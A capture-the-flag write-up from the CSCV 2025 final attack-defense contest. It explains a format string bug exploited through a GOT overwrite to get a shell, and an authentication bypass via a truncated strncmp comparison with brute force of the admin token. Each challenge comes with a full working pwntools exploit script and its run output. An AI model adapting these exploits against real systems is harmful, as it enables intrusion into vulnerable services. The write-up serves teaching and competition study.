+++
title = "CSCV 2025 Final Attack-Defense"
date = 2026-02-15T16:42:21+07:00
draft = false
+++

<img width="1908" height="960" alt="image-2" src="https://github.com/user-attachments/assets/0f8a8d9f-fc53-4afa-ba58-e605cab46d26" />

After 8 hours of Attack–Defense competition, `MTA.ADC` finished within the `Top 4 strongest` teams and achieved `3rd place` overall.

## Daemon Pwn01

<img width="586" height="388" alt="image" src="https://github.com/user-attachments/assets/12d4ee63-6f0c-4ff6-b3cd-0a93165554a9" />

Challenge directory structure:

<img width="234" height="160" alt="image-4" src="https://github.com/user-attachments/assets/a83a515b-995f-4efd-8dce-fa1e502c98d5" />

### 1. Introduction

The challenge provides a binary simulating a file manager that allows registration, login, and basic file operations.

The main vulnerability lies in how the program prints file content, resulting in a **Format String** bug that allows overwriting the **Global Offset Table (GOT)** and taking control of the program.

### 2. Binary Analysis

First, check the binary’s protection mechanisms using `checksec`:

```js
pwndbg> checksec
File:     /home/lwd3c/Desktop/CSCV2025/public/file_manager
Arch:     amd64
RELRO:      Partial RELRO
Stack:      No canary found
NX:         NX enabled
PIE:        No PIE (0x400000)
Stripped:   No
```

### 3. Vulnerability Analysis

Inspecting `file_manager.c`, we immediately find a critical **Format String** vulnerability inside `cmd_cat`:

```cpp
void cmd_cat(const char *filename) {
    // ... (login checks, filename checks, etc.)
    
    FILE *f = fopen(filepath, "r");
    if (!f) {
        printf("Cannot open file\n");
        return;
    }
    char line[1024];
    while (fgets(line, sizeof(line), f)) {
        printf(line); // <--- FORMAT STRING !
    }
    puts("");
    fclose(f);
}
```

`printf(line)` calls `printf` with user-controlled content taken directly from a file. If the file contains format specifiers (`%p`, `%s`, `%n`, …), `printf` interprets them instead of printing raw bytes.

We can use `%p` to leak addresses and `%n` to write arbitrary values to memory.

Next, the program conveniently gives us a way to write arbitrary content to a file:

```cpp
void cmd_write_file(const char *filename) {
    // ...
    printf("Enter content as hex string (e.g., 41424344 for ABCD): ");
    char hex_input[8193];
    if (!fgets(hex_input, sizeof(hex_input), stdin)) {
        // ...
    }
    // ...
    // (Hex → binary conversion and write to file)
}
```

The `cmd_write_file` function lets us write arbitrary bytes into any file via hex.

### 4. Exploitation: GOT Overwrite

Since the binary uses `Partial RELRO`, GOT entries are writable.

**Goal**: Overwrite a function pointer in GOT with the address of `system()`.

**Target**: `strtok()`

Inside `handle_command`:

```cpp
void handle_command(char *input) {
    input[strcspn(input, "\n")] = 0;
    if (strlen(input) == 0) return;
    char *cmd = strtok(input, " \t"); // <--- called immediately
    // ...
}
```

After triggering the payload overwrite (via `cat pwn.txt`), the program waits for the next input.

When we type `/bin/sh`, `handle_command` calls:

```py
strtok("/bin/sh", ...)
```

If we have overwritten `strtok@GOT `with `system`, this becomes:

```py
system("/bin/sh")
```

We get a shell.

### 5. Exploitation

#### Step 1: Login & Leak libc Address

```py
username = b"hacker"
password = b"123"
register(username, password)
login(username, password)

leak_payload = b'%15$p' 

write_file("leak.txt", leak_payload)
output = cat_file("leak.txt")

match = re.search(rb'0x[0-9a-fA-F]+', output)

libc_leak = int(match.group(0), 16)
LIBC_LEAK_OFFSET = 0x601b3 
libc.address = libc_leak - LIBC_LEAK_OFFSET
system_addr = libc.symbols['system']
```

#### Step 2: Overwrite GOT

```py
got_strtok = exe.got['strtok']
format_string_offset = 6 
writes = {got_strtok: system_addr}
payload = fmtstr_payload(format_string_offset, writes, write_size='short')
write_file("pwn.txt", payload)
```

#### Step 3: Get Shell

```py
p.sendline(b'cat pwn.txt')
p.recvuntil(b'> ') 
p.sendline(b'/bin/sh')
p.sendline(b'cat /flag.txt')
```

### Full exploit

```py
#!/usr/bin/env python3
from pwn import *

exe = ELF('file_manager', checksec=False)
libc = exe.libc

context.binary = exe
context.os = 'linux'
context.arch = 'amd64'
context.endian = 'little'

info = lambda msg: log.info(msg)
s = lambda data, proc=None: proc.send(data) if proc else p.send(data)
sa = lambda msg, data, proc=None: proc.sendafter(msg, data) if proc else p.sendafter(msg, data)
sl = lambda data, proc=None: proc.sendline(data) if proc else p.sendline(data)
sla = lambda msg, data, proc=None: proc.sendlineafter(msg, data) if proc else p.sendlineafter(msg, data)
sn = lambda num, proc=None: proc.send(str(num).encode()) if proc else p.send(str(num).encode())
sna = lambda msg, num, proc=None: proc.sendafter(msg, str(num).encode()) if proc else p.sendafter(msg, str(num).encode())
sln = lambda num, proc=None: proc.sendline(str(num).encode()) if proc else p.sendline(str(num).encode())
slna = lambda msg, num, proc=None: proc.sendlineafter(msg, str(num).encode()) if proc else p.sendlineafter(msg, str(num).encode())
r      = lambda n=4096, proc=None: proc.recv(n) if proc else p.recv(n)
rl     = lambda proc=None: proc.recvline() if proc else p.recvline()
ru     = lambda delim=b'\n', proc=None: proc.recvuntil(delim) if proc else p.recvuntil(delim)
ra     = lambda proc=None: proc.recvall() if proc else p.recvall()

def GDB():
    gdb.attach(p, gdbscript="""
        b*cmd_cat +397
        
    """)

if args.REMOTE:
    p = remote("35.240.149.115", int("1337"))
else:
    qemu_bin = None
    if qemu_bin:
        p = process([qemu_bin] + qemu_args + [exe.path]) # type: ignore
    else:
        p = process([exe.path])
    if args.GDB:
        GDB()

# Gud luk pwner !
def register(user, password):
    p.sendline(b'register')
    p.sendlineafter(b'Username: ', user)
    p.sendlineafter(b'Password: ', password)
    p.recvuntil(b'> ')

def login(user, password):
    p.sendline(b'login')
    p.sendlineafter(b'Username: ', user)
    p.sendlineafter(b'Password: ', password)
    p.recvuntil(b'> ')

def write_file(filename, content_bytes):
    p.sendline(f'write {filename}'.encode())
    hex_content = content_bytes.hex()
    p.sendlineafter(b'Enter content as hex string', hex_content.encode())
    p.recvuntil(b'> ')

def cat_file(filename):
    p.sendline(f'cat {filename}'.encode())
    return p.recvuntil(b'> ')


username = b"hacker"
password = b"123"
register(username, password)
login(username, password)

leak_payload = b'%15$p' 

write_file("leak.txt", leak_payload)
output = cat_file("leak.txt")

match = re.search(rb'0x[0-9a-fA-F]+', output)

libc_leak = int(match.group(0), 16)
LIBC_LEAK_OFFSET = 0x601b3 
libc.address = libc_leak - LIBC_LEAK_OFFSET
system_addr = libc.symbols['system']

got_strtok = exe.got['strtok']
format_string_offset = 6 
writes = {got_strtok: system_addr}
payload = fmtstr_payload(format_string_offset, writes, write_size='short')
write_file("pwn.txt", payload)

p.sendline(b'cat pwn.txt')
p.recvuntil(b'> ') 
p.sendline(b'/bin/sh')
p.sendline(b'cat /flag.txt')

p.interactive()
```

### Output

```js
(pwn) ➜ lwd3c@Lenovo-LOQ-15IRH8  ~/Desktop/CSCV2025/public  ./exploit.py REMOTE
[*] '/usr/lib/x86_64-linux-gnu/libc.so.6'
    Arch:       amd64-64-little
    RELRO:      Full RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        PIE enabled
    FORTIFY:    Enabled
    SHSTK:      Enabled
    IBT:        Enabled
[+] Opening connection to 35.240.149.115 on port 1337: Done
[*] Switching to interactive mode
CSCV2025{c1e03f78cfb98acbebc27281ad171262}$  
```

## Deamon Pwn03

<img width="583" height="354" alt="image" src="https://github.com/user-attachments/assets/809e3977-4e09-4183-946e-5be0f989b4b4" />

Challenge directory structure:

<img width="231" height="191" alt="image-1" src="https://github.com/user-attachments/assets/2e32066c-950d-4075-a413-a2eddc61fc81" />

### Challenge Overview

This challenge provides a simple server application that functions as an *Image Storage Service*. It implements several basic commands:

```js
REGISTER <user>       – Create a new user account
AUTH <user> <token>   – Authenticate (log in) to an account
LIST                  – List uploaded image files (requires auth)
UPLOAD <file>         – Upload an image (requires auth)
DOWNLOAD <file>       – Download an image (requires auth)
```

Each user has a private directory:

`/tmp/storage/<username>`

Inside this directory, a secret `token.txt` file is generated upon registration.

<img width="422" height="323" alt="image-2" src="https://github.com/user-attachments/assets/73219854-7cf5-46a4-ad35-bc2df4ebf5a9" />

Your objective is to authenticate as the pre-existing `admin` account and read the flag stored inside its directory.

### Vulnerability: Authentication Bypass

The core issue lies in the `auth_user` function in `chall.c`:

```c
if (strncmp(stored, token, strlen(token)) != 0) {
    // authentication failed
}
```

The comparison uses:

```c
strncmp(stored_token, user_supplied_token, length_of_user_supplied_token)
```

This means:

- It only compares the first `N` characters of the real token.

- And `N` is the length of the token you provide.

- Therefore, if you provide a **1-byte token**, the server only checks whether:
`stored_token[0] == your_token[0]`

So for **admin**:

- The real token is a long hex string.

- Its first character must be one of: `0 1 2 ... f`

- So by brute-forcing these 16 possibilities, you can authenticate as **admin**.

### Poor Blacklisting in LIST

Inside `list_images()`:

```c
void list_images(const char *user) {
    // ...
    while ((de = readdir(d)) != NULL) {
        if (strcmp(de->d_name, ".") == 0 || ... || strcmp(de->d_name, "..") == 0) {
            continue;
        }
        if (strcmp(de->d_name, "token.txt") == 0) {
            printf("HIDDEN\n"); 
            continue;
        }
        // ...
        printf("%s\n", files);
    }
    // ...
}
```

Only 3 filenames are hidden:
```
.
..
token.txt
```

Therefore, `flag.txt` is fully visible.

### Admin Token Brute Force

Because the first character of a hex string must be one of `0–f`, we brute-force:

```py
chars = '0123456789abcdef'

for char in chars:
    sl(f'AUTH admin {char}')
    if b'OK' in rl():
        # authenticated as admin
```

Once authenticated:

- Run `LIST` → reveals `flag.txt`

- Run `DOWNLOAD flag.txt` → read flag

### Full Exploit Script

```py
#!/usr/bin/env python3
from pwn import *

exe = ELF('chall', checksec=False)

context.binary = exe
context.os = 'linux'
context.arch = 'amd64'
context.endian = 'little'

info = lambda msg: log.info(msg)
s = lambda data, proc=None: proc.send(data) if proc else p.send(data)
sa = lambda msg, data, proc=None: proc.sendafter(msg, data) if proc else p.sendafter(msg, data)
sl = lambda data, proc=None: proc.sendline(data) if proc else p.sendline(data)
sla = lambda msg, data, proc=None: proc.sendlineafter(msg, data) if proc else p.sendlineafter(msg, data)
sn = lambda num, proc=None: proc.send(str(num).encode()) if proc else p.send(str(num).encode())
sna = lambda msg, num, proc=None: proc.sendafter(msg, str(num).encode()) if proc else p.sendafter(msg, str(num).encode())
sln = lambda num, proc=None: proc.sendline(str(num).encode()) if proc else p.sendline(str(num).encode())
slna = lambda msg, num, proc=None: proc.sendlineafter(msg, str(num).encode()) if proc else p.sendlineafter(msg, str(num).encode())
r      = lambda n=4096, proc=None: proc.recv(n) if proc else p.recv(n)
rl     = lambda proc=None: proc.recvline() if proc else p.recvline()
ru     = lambda delim=b'\n', proc=None: proc.recvuntil(delim) if proc else p.recvuntil(delim)
ra     = lambda proc=None: proc.recvall(timeout=1) if proc else p.recvall(timeout=1)

def GDB():
    gdb.attach(p, gdbscript="")
        
if args.REMOTE:
    p = remote("35.197.152.52", 1337)
else:
    p = process([exe.path])
    if args.GDB:
        GDB()

# Admin token brute-force (first byte)
chars = '0123456789abcdef'

for char in chars:
    print(f"[*] Trying admin token starting with: {char}")
        
    sl(f'AUTH admin {char}')
        
    if b'OK' in rl():
        print(f"\n[!] SUCCESS! Admin token starts with: {char}")
        print("[+] Authenticated as admin!")
            
        print("\n[*] Listing admin files...")
        sl('LIST')
        rl()
        flag = rl().decode().strip()
        print(f"[+] Files:\n{flag}")
            
        print(f"\n[*] Downloading: {flag}")
        sl(f'DOWNLOAD {flag}')
        content = rl().decode()
            
        if 'CSCV2025{' in content:
            print("\n🚩 FLAG FOUND!")
            print(content)
            break
            
p.interactive()
```

### Output

```js
(pwn) ➜ lwd3c@Lenovo-LOQ-15IRH8  ~/Desktop/CSCV2025/src-given-to-player  ./exploit.py REMOTE
[+] Opening connection to 35.197.152.52 on port 1337: Done
[*] Trying admin token starting with: 0
/home/lwd3c/Desktop/CSCV2025/src-given-to-player/./exploit.py:15: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
  sl = lambda data, proc=None: proc.sendline(data) if proc else p.sendline(data)
[*] Trying admin token starting with: 1
[*] Trying admin token starting with: 2
[*] Trying admin token starting with: 3
[*] Trying admin token starting with: 4
[*] Trying admin token starting with: 5
[*] Trying admin token starting with: 6
[*] Trying admin token starting with: 7
[*] Trying admin token starting with: 8
[*] Trying admin token starting with: 9

[!] SUCCESS! Admin token starts with: 9
[+] Authenticated as admin!

[*] Listing admin files...
[+] Files:
flag.txt


[*] Downloading: flag.txt

[+] Content of flag.txt
:
============================================================
CSCV2025{9b83f2b44e5fe69668a55fc5a1f7dace}

============================================================

🚩 FLAG FOUND in flag.txt
!
CSCV2025{9b83f2b44e5fe69668a55fc5a1f7dace}

[*] Switching to interactive mode
OK
$  
```